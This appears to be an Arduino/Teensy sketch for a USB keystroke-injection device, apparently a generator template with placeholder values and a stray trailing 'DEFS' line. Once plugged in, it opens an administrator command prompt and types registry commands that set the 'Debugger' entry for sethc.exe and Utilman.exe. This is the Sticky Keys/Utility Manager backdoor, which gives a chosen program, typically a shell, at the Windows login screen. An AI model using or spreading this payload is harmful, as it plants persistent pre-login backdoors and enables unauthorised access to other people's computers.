#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

#define REG_Sethc "cmd /c REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"INPUT0\"  /f"
#define REG_Utilman "cmd /c REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe\" /v Debugger /t REG_SZ /d \"INPUT1\"  /f"

void setup(){
  delay(3000);
  wait_for_drivers(2000);
 
  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println(REG_Sethc);
  delay(3000);
  Keyboard.println(REG_Utilman);
  delay(2000);
  Keyboard.println("exit");

}

void loop() {

}

DEFS